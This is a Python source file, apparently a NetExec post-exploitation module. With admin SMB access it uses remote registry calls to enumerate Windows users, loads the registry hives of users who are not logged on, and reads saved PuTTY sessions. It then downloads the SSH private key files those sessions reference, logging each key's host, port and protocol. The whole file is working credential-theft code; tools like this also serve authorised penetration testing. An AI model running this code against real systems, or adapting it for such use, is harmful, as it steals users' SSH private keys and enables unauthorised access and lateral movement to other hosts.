from io import BytesIO
import traceback
from urllib.parse import unquote
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from os import makedirs
from nxc.helpers.logger import highlight
from nxc.paths import NXC_PATH
import re


class NXCModule:
    """
    Example:
    -------
    Module by @yomama
    """

    name = "putty"
    description = "Query the registry for users with saved ssh private keys"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None
        self.rrp = None

    def options(self, context, module_options):
        """No options available"""

    def get_logged_on_users(self):
        """Enumerate all logged in and loaded Users on System"""
        ans = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)
        reg_handle = ans["phKey"]
        ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")
        key_handle = ans["phkResult"]
        data = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)
        users = data["lpcSubKeys"]

        # Get User Names
        user_objects = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

        # Filter legit users in regex
        user_objects.remove(".DEFAULT")
        regex = re.compile(r"^.*_Classes$")
        return [i for i in user_objects if not regex.match(i)]

    def get_all_users(self):
        """Get all users that have logged in at some point in time"""
        ans = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)
        reg_handle = ans["phKey"]
        ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")
        key_handle = ans["phkResult"]
        data = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)
        users = data["lpcSubKeys"]

        # Get User Names
        user_objects = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(users)]
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
        return user_objects

    def sid_to_name(self, all_users):
        ans = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)
        reg_handle = ans["phKey"]

        user_dict = {}
        for user_object in all_users:
            ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\{user_object}")
            key_handle = ans["phkResult"]
            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
            user_dict[user_object] = user_profile_path.split("\\")[-1]
        return user_dict

    def load_missing_users(self, unloaded_user_objects):
        """Extract Information for not logged in Users and then loads them into registry."""
        for user_object in unloaded_user_objects:
            # Extract profile Path of NTUSER.DAT
            ans = rrp.hOpenLocalMachine(self.rrp._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\" + user_object)
            key_handle = ans["phkResult"]
            user_profile_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "ProfileImagePath")[1].split("\x00")[:-1][0]
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

            # Load Profile
            ans = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")
            key_handle = ans["phkResult"]

            self.context.log.debug("LOAD USER INTO REGISTRY: " + user_object)
            rrp.hBaseRegLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object, f"{user_profile_path}\\NTUSER.DAT")
            rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

    def unload_missing_users(self, unloaded_user_objects):
        """If some user were not logged in at the beginning we unload them from registry."""
        ans = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)
        reg_handle = ans["phKey"]
        ans = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")
        key_handle = ans["phkResult"]

        for user_object in unloaded_user_objects:
            self.context.log.debug("UNLOAD USER FROM REGISTRY: " + user_object)
            try:
                rrp.hBaseRegUnLoadKey(self.rrp._RemoteOperations__rrp, key_handle, user_object)
            except Exception as e:
                self.context.log.fail(f"Error unloading user {user_object} in registry: {e}")
                self.context.log.debug(traceback.format_exc())
        rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

    def get_private_key_paths(self, all_users):
        """Get all private key paths for all users"""
        sessions = []

        reg_handle = rrp.hOpenUsers(self.rrp._RemoteOperations__rrp)["phKey"]
        key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, "")["phkResult"]

        for user in all_users:
            try:
                key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions")["phkResult"]
                reg_sessions = rrp.hBaseRegQueryInfoKey(self.rrp._RemoteOperations__rrp, key_handle)["lpcSubKeys"]
                self.context.log.info(f'Found {reg_sessions} sessions for user "{self.user_dict[user]}" in registry!')

                # Get Session Names
                session_names = [rrp.hBaseRegEnumKey(self.rrp._RemoteOperations__rrp, key_handle, i)["lpNameOut"].split("\x00")[:-1][0] for i in range(reg_sessions)]
                rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)

                # Extract stored Session infos
                for session_name in session_names:
                    key_handle = rrp.hBaseRegOpenKey(self.rrp._RemoteOperations__rrp, reg_handle, f"{user}\\Software\\SimonTatham\\PuTTY\\Sessions\\{session_name}")["phkResult"]
                    private_key_path = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PublicKeyFile")[1].split("\x00")[:-1][0]
                    hostname = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "HostName")[1].split("\x00")[:-1][0]
                    port = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "PortNumber")[1]
                    protocol = rrp.hBaseRegQueryValue(self.rrp._RemoteOperations__rrp, key_handle, "Protocol")[1].split("\x00")[:-1][0]
                    sessions.append({"user": self.user_dict[user], "session_name": unquote(session_name), "private_key_path": private_key_path, "hostname": hostname, "port": port, "protocol": protocol})
                    rrp.hBaseRegCloseKey(self.rrp._RemoteOperations__rrp, key_handle)
                
            except DCERPCException as e:
                if str(e).find("ERROR_FILE_NOT_FOUND"):
                    self.context.log.debug(f"No PuTTY session config found in registry for user {self.user_dict[user]}")
            except Exception as e:
                self.context.log.fail(f"Unexpected error: {e}")
                self.context.log.debug(traceback.format_exc())
        return sessions
    
    def extract_private_keys(self, sessions):
        for session in sessions:
            if session["private_key_path"]:
                makedirs(f"{NXC_PATH}/modules/PuTTY", exist_ok=True)
                share = session["private_key_path"].split(":")[0] + "$"
                file_path = session["private_key_path"].split(":")[1]
                download_path = f"{NXC_PATH}/modules/PuTTY/putty_{session['user']}_{session['session_name']}.sec"

                buf = BytesIO()
                with open(download_path, "wb") as file:
                    try:
                        self.connection.conn.getFile(share, file_path, buf.write)
                    except Exception as e:
                        if str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") != -1:
                            self.context.log.fail(f"Private key path found but file not found: {highlight(share + file_path)}")
                        else:
                            self.context.log.exception(f"Error downloading private key: {e}")
                        continue
                    file.write(buf.getvalue())
                self.context.log.success(f"Private key found for user {highlight(session['user'])}, saved to {highlight(download_path)}")
                self.context.log.highlight(f"======={session['session_name']}=======")
                self.context.log.highlight(f"Host: {session['hostname']}:{session['port']}")
                self.context.log.highlight(f"Protocol: {session['protocol']}")

    def on_admin_login(self, context, connection):
        self.connection = connection
        self.context = context

        try:
            self.rrp = RemoteOperations(connection.conn, connection.kerberos)
            self.rrp.enableRegistry()

            all_users = self.get_all_users()
            loaded_user_objects = self.get_logged_on_users()
            self.user_dict = self.sid_to_name(all_users)

            # Users which must be loaded into registry:
            unloaded_user_objects = list(set(all_users).symmetric_difference(set(loaded_user_objects)))
            self.load_missing_users(unloaded_user_objects)

            sessions = self.get_private_key_paths(all_users)
            if sessions:
                self.extract_private_keys(sessions)
            else:
                self.context.log.info("No saved putty sessions found in registry")

            self.unload_missing_users(unloaded_user_objects)
        except Exception as e:
            context.log.exception(f"Error: {e}")
        finally:
            self.rrp.finish()
